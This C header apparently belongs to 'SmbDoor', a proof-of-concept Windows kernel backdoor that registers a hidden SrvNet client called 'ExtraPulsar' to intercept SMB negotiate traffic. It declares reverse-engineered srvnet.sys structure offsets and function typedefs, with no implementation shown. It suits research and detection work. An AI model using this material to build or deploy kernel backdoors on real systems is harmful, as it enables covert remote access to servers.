#pragma once

// disable warning about data to function pointer conversion because it's 2019 not 1942
#pragma warning(disable:4152)

#define SMBDOOR_POOL_TAG 'rooD'

#define SMBDOOR_SRVNET_NAME  L"ExtraPulsar"
#define SMBDOOR_SMB_HEADER	'uPxE'		// ExPu

NTSTATUS SmbDoorRegisterSrvNet(VOID);
VOID SmbDoorDeregisterSrvNet(VOID);

// callbacks for the SrvNet registration
NTSTATUS SmbDoorGenericCallback(VOID);
NTSTATUS SmbDoorNegotiateCallback(PVOID Unknown, SIZE_T RawSize, PUCHAR RawBytes);

typedef struct _SMBDOOR_SRVNET_REGISTRATION
{
	UNICODE_STRING ServerName;		// 0x0		rbp - 88h
	INT64 unknown0;					// 0x10
	PVOID fnRegisterEndpoint;		// 0x18		rbp - 70h
	PVOID fnDeregisterEndpoint;		// 0x20		rbp - 68h
	PVOID fnNegotiateHandler;		// 0x28		rbp - 60h
	PVOID fnConnectHandler;			// 0x30		rbp - 58h
	PVOID fnReceiveHandler;			// 0x38		rbp - 50h
	PVOID fnDisconnectHandler;		// 0x40		rbp - 48h
	PVOID fnUpdateNetnameTable;		// 0x48		???
	PVOID fnUnknownCallback1;		// 0x50
	INT64 Unknown2;					// 0x58
									// 0x60
} SMBDOOR_SRVNET_REGISTRATION, *PSMBDOOR_SRVNET_REGISTRATION;


// definitions for dynamically locating srvnet.sys exports

NTSTATUS SmbDoorGetModuleByName(
	_In_ LPCSTR driverName,
	_Out_ PVOID *ImageBase
);

NTSTATUS SmbDoorGetRoutineByName(
	_In_ PVOID DriverImageBase,
	_In_ LPCSTR FunctionName,
	_Out_ PVOID *RoutineAddress
);

typedef NTSTATUS(NTAPI *SRVNETREGISTERCLIENT)(_In_ PSMBDOOR_SRVNET_REGISTRATION ServerRegistration, _Out_ HANDLE Handle);
typedef NTSTATUS(NTAPI *SRVNETSTARTCLIENT)(_In_ HANDLE Handle);
typedef NTSTATUS(NTAPI *SRVNETSTOPCLIENT)(_In_ HANDLE Handle);
typedef NTSTATUS(NTAPI *SRVNETDEREGISTERCLIENT)(_In_ HANDLE Handle);

typedef NTSTATUS(NTAPI *RTLQUERYMODULEINFORMATION)(ULONG *InformationLength, ULONG SizePerModule, PVOID InformationBuffer);
typedef PVOID(NTAPI *RTLIMAGEDIRECTORYENTRYTODATA)(IN PVOID Base, IN BOOLEAN MappedAsImage, IN USHORT DirectoryEntry, OUT PULONG Size);

typedef struct _RTL_MODULE_EXTENDED_INFO
{
	PVOID ImageBase;
	ULONG ImageSize;
	USHORT FileNameOffset;
	CHAR FullPathName[0x100];
} RTL_MODULE_EXTENDED_INFO, *PRTL_MODULE_EXTENDED_INFO;

#define SMBDOOR_CONVERT_RVA(base, offset) ((PVOID)((PUCHAR)(base) + (ULONG)(offset)))

typedef struct _SMBDOOR_SRVNET_ROUTINES
{
	PVOID SrvNetBase;
	SRVNETREGISTERCLIENT	SrvNetRegisterClient;
	SRVNETSTARTCLIENT		SrvNetStartClient;
	SRVNETSTOPCLIENT		SrvNetStopClient;
	SRVNETDEREGISTERCLIENT	SrvNetDeregisterClient;
} SMBDOOR_SRVNET_ROUTINES, *PSMBDOOR_SRVNET_ROUTINES;
